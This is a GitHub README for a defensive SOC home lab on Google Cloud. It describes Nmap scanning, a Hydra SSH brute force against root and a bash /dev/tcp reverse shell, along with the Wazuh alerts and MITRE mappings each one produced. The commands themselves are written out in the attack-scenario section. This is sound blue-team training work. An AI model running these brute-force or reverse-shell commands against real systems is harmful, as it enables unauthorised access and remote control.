# SOC-Home-Lab
# 🛡️ Cloud-Based SOC Home Lab

A fully functional Security Operations Center (SOC) simulation built on Google Cloud Platform. This project demonstrates real-world blue team skills including threat detection, alert triage, MITRE ATT&CK mapping, and incident response documentation.

---

## 🎯 Objective

The goal of this project was to simulate a real enterprise SOC environment where actual cyberattacks are launched, detected, investigated, and documented — mirroring the day-to-day responsibilities of a SOC Analyst.

---

## ☁️ Infrastructure

All virtual machines were deployed on Google Cloud Platform (asia-south2, Delhi region) on the same internal network to simulate an enterprise environment.

| Machine | OS | Internal IP | Role |
|---|---|---|---|
| kali-attacker | Debian 11 | 10.190.0.4 | Attacker Machine |
| wazuh-siem | Ubuntu 22.04 LTS | 10.190.0.5 | SIEM Server |
| victim-machine | Ubuntu 22.04 LTS | 10.190.0.7 | Target Endpoint |

---

## 🛠️ Tools & Technologies

| Tool | Purpose |
|---|---|
| Wazuh 4.7.5 | SIEM — log collection, alerting, threat detection |
| Nmap | Network reconnaissance and service enumeration |
| Hydra | SSH brute force simulation |
| Netcat | Reverse shell simulation |
| Google Cloud Platform | Cloud infrastructure |
| MITRE ATT&CK Navigator | Technique mapping |

---

## 🏗️ Architecture

<img width="1536" height="1024" alt="image" src="https://github.com/user-attachments/assets/65d80363-82c9-4ad6-bfaa-ac94aaac733c" />
## ⚔️ Attack Scenarios

### Attack #001 — Network Reconnaissance
**Tool:** Nmap  
**Command:** `nmap -sV -sC 10.190.0.7`  
**Description:** Performed a service and script scan against the victim machine to enumerate open ports and running services. Wazuh detected SSH probing triggered by the scan.

**Detection:**
- Alert: sshd — Attempt to login using a non-existent user
- Wazuh Rule ID: 5710
- Severity: Medium (Level 5)
- MITRE: T1110.001, T1021.004 — Credential Access, Lateral Movement

[📄 View Full IR Report](Reports/IR-001-Nmap-Scan.md.)

---

### Attack #002 — SSH Brute Force
**Tool:** Hydra v9.1  
**Command:** `hydra -l root -P rockyou.txt ssh://10.190.0.7 -t 4`  
**Description:** Launched a dictionary attack against the victim's SSH service using the rockyou wordlist. Successfully cracked the root password within 8 attempts.

**Detection:**
- Alert: Multiple authentication failures followed by a success
- Wazuh Rule ID: 40112
- Severity: **Critical (Level 12)**
- MITRE: T1110, T1078 — Credential Access, Privilege Escalation

[📄 View Full IR Report](reports/IR-002-Brute-Force.md)

---

### Attack #003 — Reverse Shell
**Tool:** Netcat  
**Payload:** `bash -i >& /dev/tcp/10.190.0.4/4444 0>&1`  
**Description:** After gaining credentials via brute force, established a reverse shell from the victim machine back to the attacker. Gained full interactive root shell on the victim.

**Detection:**
- Alert: Successful sudo to ROOT executed
- Wazuh Rule ID: 5402
- Severity: Medium (Level 3)
- MITRE: T1548.003, T1059.004 — Privilege Escalation, Execution

[📄 View Full IR Report](reports/IR-003-Reverse-Shell.md)

---

## 📊 MITRE ATT&CK Coverage

| Tactic | Technique ID | Technique Name | Detected |
|---|---|---|---|
| Reconnaissance | T1595 | Active Scanning | ✅ |
| Credential Access | T1110 | Brute Force | ✅ |
| Credential Access | T1110.001 | Password Guessing | ✅ |
| Initial Access | T1078 | Valid Accounts | ✅ |
| Lateral Movement | T1021.004 | Remote Services: SSH | ✅ |
| Privilege Escalation | T1548.003 | Abuse Elevation: Sudo | ✅ |
| Execution | T1059.004 | Unix Shell | ✅ |

---

## 🔍 Key Results

- Wazuh successfully detected **100% of simulated attacks**
- SSH brute force triggered a **Level 12 Critical alert** — the highest severity observed
- Reverse shell activity was flagged via **privilege escalation monitoring**
- All detections were automatically mapped to the **MITRE ATT&CK framework**
- Both attacker and victim machines were monitored simultaneously via Wazuh agents


---

## 💡 Lessons Learned

- Weak passwords remain one of the most critical vulnerabilities — the root account was cracked in under 10 seconds
- Default SSH configurations expose systems to brute force attacks
- A properly configured SIEM can detect attack chains in real time, not just individual events
- MITRE ATT&CK mapping helps contextualize alerts and prioritize response
- Cloud environments require proper firewall rules and egress filtering to prevent reverse shell callbacks

---

## 🔮 Future Work

- [ ] Add custom Wazuh detection rules
- [ ] Integrate VirusTotal API for threat intelligence enrichment
- [ ] Simulate lateral movement between machines
- [ ] Add Windows victim machine for Windows-specific attack scenarios
- [ ] Build MITRE ATT&CK heatmap using ATT&CK Navigator
- [ ] Automate IR report generation

---

## ⚠️ Disclaimer

This project was built entirely for educational purposes. All attacks were performed in an isolated Google Cloud environment. No real systems, networks, or individuals were targeted. Ethical guidelines were followed throughout.

---

## 👤 Author

**Himanshu Jha**  
Aspiring SOC Analyst | New Delhi, India  
📧 jhahimanshu168@gmail.com  
🔗 [LinkedIn Profile]([https://www.linkedin.com/in/himanshu-jha-398a57200/])  
📝 [Medium]([https://medium.com/@Deku280])
